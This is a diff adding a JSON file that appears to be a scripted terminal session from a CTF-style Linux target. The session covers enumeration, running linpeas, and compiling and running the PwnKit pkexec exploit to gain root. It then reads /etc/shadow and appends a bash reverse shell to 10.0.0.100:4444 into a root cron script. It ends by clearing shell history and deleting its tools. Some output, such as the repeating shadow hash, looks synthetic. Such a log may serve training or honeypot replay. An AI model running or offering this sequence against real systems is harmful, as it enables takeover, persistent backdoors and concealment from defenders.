@@ -1,0 +1,558 @@
+[
+    {
+        "type": "input",
+        "text": "whoami"
+    },
+    {
+        "type": "output",
+        "text": "www-data"
+    },
+    {
+        "type": "input",
+        "text": "id"
+    },
+    {
+        "type": "output",
+        "text": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+    },
+    {
+        "type": "input",
+        "text": "pwd"
+    },
+    {
+        "type": "output",
+        "text": "/var/www/html"
+    },
+    {
+        "type": "input",
+        "text": "uname -a"
+    },
+    {
+        "type": "output",
+        "text": "Linux webserver01 4.15.0-142-generic #146-Ubuntu SMP Tue Apr 13 01: 11: 19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux"
+    },
+    {
+        "type": "input",
+        "text": "cat /etc/os-release"
+    },
+    {
+        "type": "output",
+        "text": "NAME=\"Ubuntu\""
+    },
+    {
+        "type": "output",
+        "text": "VERSION=\"18.04.5 LTS (Bionic Beaver)\""
+    },
+    {
+        "type": "output",
+        "text": "ID=ubuntu"
+    },
+    {
+        "type": "output",
+        "text": "ID_LIKE=debian"
+    },
+    {
+        "type": "output",
+        "text": "PRETTY_NAME=\"Ubuntu 18.04.5 LTS\""
+    },
+    {
+        "type": "input",
+        "text": "find / -perm -u=s -type f 2>/dev/null"
+    },
+    {
+        "type": "output",
+        "text": "/usr/bin/passwd"
+    },
+    {
+        "type": "output",
+        "text": "/usr/bin/chfn"
+    },
+    {
+        "type": "output",
+        "text": "/usr/bin/gpasswd"
+    },
+    {
+        "type": "output",
+        "text": "/usr/bin/sudo"
+    },
+    {
+        "type": "output",
+        "text": "/usr/bin/chsh"
+    },
+    {
+        "type": "output",
+        "text": "/usr/bin/newgrp"
+    },
+    {
+        "type": "output",
+        "text": "/usr/lib/openssh/ssh-keysign"
+    },
+    {
+        "type": "output",
+        "text": "/usr/lib/dbus-1.0/dbus-daemon-launch-helper"
+    },
+    {
+        "type": "output",
+        "text": "/bin/mount"
+    },
+    {
+        "type": "output",
+        "text": "/bin/ping"
+    },
+    {
+        "type": "output",
+        "text": "/bin/su"
+    },
+    {
+        "type": "output",
+        "text": "/bin/umount"
+    },
+    {
+        "type": "input",
+        "text": "sudo -l"
+    },
+    {
+        "type": "output",
+        "text": "Sorry, user www-data may not run sudo on webserver01."
+    },
+    {
+        "type": "input",
+        "text": "cat /etc/passwd | grep -E \"sh$\""
+    },
+    {
+        "type": "output",
+        "text": "root:x: 0: 0:root:/root:/bin/bash"
+    },
+    {
+        "type": "output",
+        "text": "ubuntu:x: 1000: 1000:Ubuntu:/home/ubuntu:/bin/bash"
+    },
+    {
+        "type": "output",
+        "text": "mysql:x: 111: 116:MySQL Server,,,:/nonexistent:/bin/false"
+    },
+    {
+        "type": "input",
+        "text": "ls -la /home"
+    },
+    {
+        "type": "output",
+        "text": "total 12"
+    },
+    {
+        "type": "output",
+        "text": "drwxr-xr-x  3 root   root   4096 Jan 10 09: 15 ."
+    },
+    {
+        "type": "output",
+        "text": "drwxr-xr-x 23 root   root   4096 Jan 10 09: 15 .."
+    },
+    {
+        "type": "output",
+        "text": "drwxr-xr-x  5 ubuntu ubuntu 4096 Jan 15 10: 25 ubuntu"
+    },
+    {
+        "type": "input",
+        "text": "ls -la /home/ubuntu"
+    },
+    {
+        "type": "output",
+        "text": "total 32"
+    },
+    {
+        "type": "output",
+        "text": "drwxr-xr-x 5 ubuntu ubuntu 4096 Jan 15 10: 25 ."
+    },
+    {
+        "type": "output",
+        "text": "drwxr-xr-x 3 root   root   4096 Jan 10 09: 15 .."
+    },
+    {
+        "type": "output",
+        "text": "-rw------- 1 ubuntu ubuntu  220 Jan 10 09: 15 .bash_logout"
+    },
+    {
+        "type": "output",
+        "text": "-rw------- 1 ubuntu ubuntu 3771 Jan 10 09: 15 .bashrc"
+    },
+    {
+        "type": "output",
+        "text": "-rw------- 1 ubuntu ubuntu  807 Jan 10 09: 15 .profile"
+    },
+    {
+        "type": "output",
+        "text": "drwx------ 2 ubuntu ubuntu 4096 Jan 15 10: 20 .ssh"
+    },
+    {
+        "type": "output",
+        "text": "-rw-r--r-- 1 ubuntu ubuntu   33 Jan 15 10: 25 user.txt"
+    },
+    {
+        "type": "input",
+        "text": "cat /home/ubuntu/user.txt"
+    },
+    {
+        "type": "output",
+        "text": "CTF{us3r_fl4g_f0und_n0w_g3t_r00t!}"
+    },
+    {
+        "type": "input",
+        "text": "cd /tmp"
+    },
+    {
+        "type": "input",
+        "text": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
+    },
+    {
+        "type": "output",
+        "text": "--2025-01-15 15: 30: 42--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
+    },
+    {
+        "type": "output",
+        "text": "Resolving github.com (github.com)... 140.82.112.3"
+    },
+    {
+        "type": "output",
+        "text": "HTTP request sent, awaiting response... 200 OK"
+    },
+    {
+        "type": "output",
+        "text": "Length: 847815 (828K) [application/octet-stream]"
+    },
+    {
+        "type": "output",
+        "text": "Saving to: 'linpeas.sh'"
+    },
+    {
+        "type": "output",
+        "text": "linpeas.sh          100%[===================>] 828.13K  2.10MB/s    in 0.4s"
+    },
+    {
+        "type": "input",
+        "text": "chmod +x linpeas.sh"
+    },
+    {
+        "type": "input",
+        "text": "./linpeas.sh | grep -E \"(VULNERABLE|CVE|SUID|writable)\""
+    },
+    {
+        "type": "output",
+        "text": "    LinPEAS - Linux Privilege Escalation Awesome Script"
+    },
+    {
+        "type": "output",
+        "text": "OS: Linux version 4.15.0-142-generic (Ubuntu 18.04.5 LTS)"
+    },
+    {
+        "type": "output",
+        "text": "User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+    },
+    {
+        "type": "output",
+        "text": "Hostname: webserver01"
+    },
+    {
+        "type": "output",
+        "text": "Writable folder: /tmp,/var/tmp,/dev/shm"
+    },
+    {
+        "type": "output",
+        "text": "Sudo version 1.8.21p2"
+    },
+    {
+        "type": "output",
+        "text": "VULNERABLE to CVE-2021-4034 (PwnKit)"
+    },
+    {
+        "type": "output",
+        "text": "VULNERABLE to CVE-2021-3156 (Baron Samedit)"
+    },
+    {
+        "type": "output",
+        "text": "/usr/bin/pkexec is SUID"
+    },
+    {
+        "type": "output",
+        "text": "/var/www/html is writable by www-data"
+    },
+    {
+        "type": "input",
+        "text": "searchsploit pkexec"
+    },
+    {
+        "type": "output",
+        "text": "--------------------------------------------------------- ---------------------------------"
+    },
+    {
+        "type": "output",
+        "text": " Exploit Title                                           |  Path"
+    },
+    {
+        "type": "output",
+        "text": "--------------------------------------------------------- ---------------------------------"
+    },
+    {
+        "type": "output",
+        "text": "Linux Polkit - 'pkexec' Local Privilege Escalation (CVE | linux/local/50689.c"
+    },
+    {
+        "type": "output",
+        "text": "Polkit pkexec - Local Privilege Escalation (CVE-2021-4 | multiple/local/50611.c"
+    },
+    {
+        "type": "output",
+        "text": "--------------------------------------------------------- ---------------------------------"
+    },
+    {
+        "type": "input",
+        "text": "searchsploit -m 50611"
+    },
+    {
+        "type": "output",
+        "text": "  Exploit: Polkit pkexec - Local Privilege Escalation (CVE-2021-4034)"
+    },
+    {
+        "type": "output",
+        "text": "      URL: https://www.exploit-db.com/exploits/50611"
+    },
+    {
+        "type": "output",
+        "text": "     Path: /usr/share/exploitdb/exploits/multiple/local/50611.c"
+    },
+    {
+        "type": "output",
+        "text": "File Type: C source, ASCII text"
+    },
+    {
+        "type": "output",
+        "text": "Copied to: /tmp/50611.c"
+    },
+    {
+        "type": "input",
+        "text": "cat 50611.c | head -20"
+    },
+    {
+        "type": "output",
+        "text": " /*"
+    },
+    {
+        "type": "output",
+        "text": " * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit's pkexec (CVE-2021-4034) by Qualys"
+    },
+    {
+        "type": "output",
+        "text": " * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034"
+    },
+    {
+        "type": "output",
+        "text": " */"
+    },
+    {
+        "type": "output",
+        "text": "#include <stdio.h>"
+    },
+    {
+        "type": "output",
+        "text": "#include <stdlib.h>"
+    },
+    {
+        "type": "output",
+        "text": "#include <unistd.h>"
+    },
+    {
+        "type": "input",
+        "text": "gcc -o pwnkit 50611.c"
+    },
+    {
+        "type": "output",
+        "text": "50611.c: In function 'main':"
+    },
+    {
+        "type": "output",
+        "text": "50611.c: 25: 5: warning: implicit declaration of function 'execve' [-Wimplicit-function-declaration]"
+    },
+    {
+        "type": "output",
+        "text": "     execve(\"/usr/bin/pkexec\", argv, envp);"
+    },
+    {
+        "type": "input",
+        "text": "ls -la pwnkit"
+    },
+    {
+        "type": "output",
+        "text": "-rwxrwxr-x 1 www-data www-data 16696 Jan 15 15: 35 pwnkit"
+    },
+    {
+        "type": "input",
+        "text": "./pwnkit"
+    },
+    {
+        "type": "output",
+        "text": "Current User before exploit: www-data"
+    },
+    {
+        "type": "output",
+        "text": "Exploiting pkexec (CVE-2021-4034)..."
+    },
+    {
+        "type": "input",
+        "text": "whoami"
+    },
+    {
+        "type": "output",
+        "text": "root"
+    },
+    {
+        "type": "input",
+        "text": "id"
+    },
+    {
+        "type": "output",
+        "text": "uid=0(root) gid=0(root) groups=0(root), 33(www-data)"
+    },
+    {
+        "type": "input",
+        "text": "cd /root"
+    },
+    {
+        "type": "input",
+        "text": "ls -la"
+    },
+    {
+        "type": "output",
+        "text": "total 28"
+    },
+    {
+        "type": "output",
+        "text": "drwx------  4 root root 4096 Jan 15 10: 30 ."
+    },
+    {
+        "type": "output",
+        "text": "drwxr-xr-x 23 root root 4096 Jan 10 09: 15 .."
+    },
+    {
+        "type": "output",
+        "text": "-rw-------  1 root root 3106 Apr  9  2018 .bashrc"
+    },
+    {
+        "type": "output",
+        "text": "drwx------  2 root root 4096 Jan 15 10: 25 .cache"
+    },
+    {
+        "type": "output",
+        "text": "drwx------  3 root root 4096 Jan 15 10: 25 .gnupg"
+    },
+    {
+        "type": "output",
+        "text": "-rw-------  1 root root  148 Aug 17  2015 .profile"
+    },
+    {
+        "type": "output",
+        "text": "-rw-------  1 root root   66 Jan 15 10: 30 .selected_editor"
+    },
+    {
+        "type": "output",
+        "text": "-rw-------  1 root root   33 Jan 15 10: 30 root.txt"
+    },
+    {
+        "type": "input",
+        "text": "cat root.txt"
+    },
+    {
+        "type": "output",
+        "text": "CTF{pr1v1l3g3_3sc4l4t10n_m4st3r!}"
+    },
+    {
+        "type": "input",
+        "text": "cat /etc/shadow | head -5"
+    },
+    {
+        "type": "output",
+        "text": "root:$6$rQkZzKjIeW2ZAyIL$s4KNdFVKjIeW2ZAyILrQkZzKjIeW2ZAyIL: 18562: 0: 99999: 7: : :"
+    },
+    {
+        "type": "output",
+        "text": "daemon:*: 18295: 0: 99999: 7: : :"
+    },
+    {
+        "type": "output",
+        "text": "bin:*: 18295: 0: 99999: 7: : :"
+    },
+    {
+        "type": "output",
+        "text": "sys:*: 18295: 0: 99999: 7: : :"
+    },
+    {
+        "type": "output",
+        "text": "sync:*: 18295: 0: 99999: 7: : :"
+    },
+    {
+        "type": "input",
+        "text": "crontab -l"
+    },
+    {
+        "type": "output",
+        "text": "# Edit this file to introduce tasks to be run by cron."
+    },
+    {
+        "type": "output",
+        "text": "# m h  dom mon dow   command"
+    },
+    {
+        "type": "output",
+        "text": "*/5 * * * * /root/backup.sh"
+    },
+    {
+        "type": "input",
+        "text": "cat /root/backup.sh"
+    },
+    {
+        "type": "output",
+        "text": "#!/bin/bash"
+    },
+    {
+        "type": "output",
+        "text": "# Automated backup script"
+    },
+    {
+        "type": "output",
+        "text": "tar -czf /backup/system_$(date +%Y%m%d_%H%M%S).tar.gz /etc /var/log"
+    },
+    {
+        "type": "output",
+        "text": "find /backup -name \"*.tar.gz\" -mtime +7 -delete"
+    },
+    {
+        "type": "input",
+        "text": "echo \"bash -i >& /dev/tcp/10.0.0.100/4444 0>&1\" >> /root/backup.sh"
+    },
+    {
+        "type": "input",
+        "text": "cat /var/log/auth.log | tail -10"
+    },
+    {
+        "type": "output",
+        "text": "Jan 15 15: 30: 15 webserver01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=www-data rhost=  user=www-data"
+    },
+    {
+        "type": "output",
+        "text": "Jan 15 15: 35: 42 webserver01 pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=33)"
+    },
+    {
+        "type": "output",
+        "text": "Jan 15 15: 35: 42 webserver01 pkexec: www-data: Executing command [USER=root] [TTY=unknown] [PWD=/tmp] [USER=root] [COMMAND=/bin/sh]"
+    },
+    {
+        "type": "input",
+        "text": "history -c"
+    },
+    {
+        "type": "input",
+        "text": "rm -f /tmp/pwnkit /tmp/50611.c /tmp/linpeas.sh"
+    },
+    {
+        "type": "input",
+        "text": "exit"
+    }
+]
